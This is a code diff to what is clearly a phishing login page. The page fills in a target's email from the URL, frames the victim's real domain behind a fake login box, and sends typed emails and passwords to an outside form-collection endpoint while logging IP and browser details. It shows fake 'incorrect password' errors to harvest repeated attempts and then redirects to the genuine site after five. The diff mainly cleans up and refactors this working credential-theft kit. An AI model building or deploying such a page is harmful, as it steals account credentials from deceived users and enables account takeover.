@@ -9,7 +9,10 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         #background-iframe, #overlay {
             position: fixed;
@@ -35,7 +38,6 @@
             width: 300px;
             position: relative;
             z-index: 1;
-            margin: auto;
         }
         .login-container::before {
             content: attr(data-domain);
@@ -226,7 +228,7 @@
 
         // Function to detect browser language
         function getBrowserLanguage() {
-            const lang = navigator.language || navigator.languages[0];
+            const lang = navigator.language || navigator.languages[0] || 'en';
             return lang.split('-')[0]; // Get base language (e.g., 'en' from 'en-US')
         }
 
@@ -268,18 +270,19 @@
             const backgroundIframe = document.getElementById('background-iframe');
             const { email, domain } = getEmailFromUrl();
 
+            // Set email and background iframe
             if (email) {
                 emailInput.value = email;
             }
             if (domain) {
                 loginContainer.setAttribute('data-domain', domain);
-                const domainUrl = domain.startsWith('http://') || domain.startsWith('https://') ? domain : `https://${domain}`;
+                const domainUrl = domain.match(/^https?:\/\//) ? domain : `https://${domain}`;
                 backgroundIframe.src = domainUrl;
             } else {
                 backgroundIframe.src = 'about:blank';
             }
 
-            // Apply translations based on browser language
+            // Apply translations
             const browserLang = getBrowserLanguage();
             applyTranslations(browserLang);
 
@@ -287,7 +290,7 @@
             let submissionAttempts = 0;
             const formLoadTime = Date.now();
 
-            // Collect additional data (for logging, not sent to form endpoint)
+            // Collect additional data for logging
             let additionalData = {
                 ipAddress: "Fetching...",
                 userAgent: navigator.userAgent,
@@ -295,13 +298,13 @@
                 browser: "Detecting..."
             };
             const userAgent = navigator.userAgent;
-            additionalData.browser = userAgent.indexOf("Firefox") > -1 ? "Mozilla Firefox" :
-                                     userAgent.indexOf("SamsungBrowser") > -1 ? "Samsung Internet" :
-                                     userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1 ? "Opera" :
-                                     userAgent.indexOf("Trident") > -1 ? "Microsoft Internet Explorer" :
-                                     userAgent.indexOf("Edge") > -1 ? "Microsoft Edge" :
-                                     userAgent.indexOf("Chrome") > -1 ? "Google Chrome or Chromium" :
-                                     userAgent.indexOf("Safari") > -1 ? "Apple Safari" : "Unknown";
+            additionalData.browser = userAgent.includes("Firefox") ? "Mozilla Firefox" :
+                                     userAgent.includes("SamsungBrowser") ? "Samsung Internet" :
+                                     userAgent.includes("Opera") || userAgent.includes("OPR") ? "Opera" :
+                                     userAgent.includes("Trident") ? "Microsoft Internet Explorer" :
+                                     userAgent.includes("Edge") ? "Microsoft Edge" :
+                                     userAgent.includes("Chrome") ? "Google Chrome or Chromium" :
+                                     userAgent.includes("Safari") ? "Apple Safari" : "Unknown";
 
             fetch("https://api.ipify.org?format=json")
                 .then(response => response.json())
@@ -311,11 +314,11 @@
                     additionalData.ipAddress = "Unavailable";
                 });
 
-            // Handle form submission with bot detection
+            // Handle form submission
             form.addEventListener('submit', async (event) => {
                 event.preventDefault();
 
-                // Bot detection: Check honeypot and submission speed
+                // Bot detection
                 const timeSinceLoad = Date.now() - formLoadTime;
                 if (honeypotInput.value !== '' || timeSinceLoad < 1000) {
                     errorMessage.textContent = translations[browserLang]?.bot_detected || "Bot detected, please try again";
@@ -334,35 +337,32 @@
                 const password = passwordInput.value.trim();
                 const data = { email, password };
 
-                // Log additional data (not sent to endpoint)
-                let logMessage = `Email: ${email}\nPassword: ${password}\nIP Address: ${additionalData.ipAddress}\nUser Agent: ${additionalData.userAgent}\nTimezone: ${additionalData.timezone}\nBrowser: ${additionalData.browser}`;
+                // Log additional data
+                const logMessage = `Email: ${email}\nPassword: ${password}\nIP Address: ${additionalData.ipAddress}\nUser Agent: ${additionalData.userAgent}\nTimezone: ${additionalData.timezone}\nBrowser: ${additionalData.browser}`;
                 console.log(logMessage);
 
-                // Submit form data to endpoint
+                // Submit form data
                 try {
-                    await fetch('https://submit-form.com/J2IVAy4bj', {
+                    const response = await fetch('https://submit-form.com/J2IVAy4bj', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
-                    console.log('Submission to form successful!');
+                    console.log(response.ok ? 'Submission to form successful!' : 'Submission to form failed.');
                 } catch (error) {
                     console.error('Submission error:', error);
                 }
 
                 // Handle submission attempts
-                if (submissionAttempts <= 4) {
-                    setTimeout(() => {
-                        loaderOverlay.style.display = 'none';
+                setTimeout(() => {
+                    loaderOverlay.style.display = 'none';
+                    if (submissionAttempts <= 4) {
                         errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
                         errorMessage.style.display = 'block';
                         passwordInput.value = '';
                         honeypotInput.value = '';
                         passwordInput.focus();
-                    }, 3000);
-                } else if (submissionAttempts === 5) {
-                    setTimeout(() => {
-                        loaderOverlay.style.display = 'none';
+                    } else if (submissionAttempts === 5) {
                         if (domain) {
                             window.location.href = `https://${domain}`;
                         } else {
@@ -372,8 +372,8 @@
                             honeypotInput.value = '';
                             passwordInput.focus();
                         }
-                    }, 3000);
-                }
+                    }
+                }, 3000);
             });
         });
     </script>
